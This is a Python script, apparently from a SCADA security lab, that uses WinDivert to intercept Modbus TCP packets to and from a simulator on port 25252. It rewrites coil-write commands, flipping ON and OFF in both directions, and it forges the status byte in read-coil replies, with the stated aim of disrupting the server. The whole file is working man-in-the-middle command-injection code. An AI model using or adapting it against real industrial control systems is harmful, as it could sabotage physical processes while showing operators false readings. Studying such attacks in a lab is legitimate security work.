import pydivert
import threadManagement

"""
Sve write poruke su fiksno 12 bajtova 
Hvata ili one koje idu na port 25252(simulator scade) ili one koje idu na izvorni port 
Moraju se poruke uhvatiti u oba smera kako bi se skroz narusio server  
"""

def inject(packet, packetManipulator : pydivert, send : bool):
    message = bytearray(packet.payload)
    functionCode = message[7]
    if functionCode == 5:
        value = int.from_bytes(message[10:12],byteorder='big')
        print(f"Packet pre injektovanja: {packet.payload}")
        print(f"Komanda pre injektovanja: {message[10:12]}")
        if value==65280:
            if send == True:
                value = 0
                maliciousCommand = value.to_bytes(2,byteorder='big')
                message[10:12] = maliciousCommand
                packet.payload = message
                print(f"Packet nakon injektovanja: {packet.payload}")
                print(f"Komanda nakon injektovanja: {message[10:12]}")
            packetManipulator.send(packet)
        else:
            if send == False:
                value = 65280
                maliciousCommand = value.to_bytes(2,byteorder='big')
                message[10:12] = maliciousCommand
                packet.payload = message
                print(f"Packet nakon injektovanja: {packet.payload}")
                print(f"Komanda nakon injektovanja: {message[10:12]}")
            packetManipulator.send(packet)
    elif functionCode == 1:
        if send == False:
            message[9] = 1
            packet.payload = message
            print(f"OVO JE FUS DIGITAL READ: {packet.payload}")
        packetManipulator.send(packet)
    else:
        packetManipulator.send(packet)


def comandInjection(sourcePort):
    with pydivert.WinDivert(f"(tcp.DstPort == 25252 or tcp.DstPort =={sourcePort}) and (tcp.PayloadLength == 12 or tcp.PayloadLength == 10)") as w:
        for packet in w:
            match packet.dst_port:
                case 25252:
                    inject(packet,w, True)
                case sourcePort:
                    inject(packet,w, False)
            with threadManagement.ThreadManagement.injectionLock:
                if threadManagement.ThreadManagement.stopInject == True:
                    return
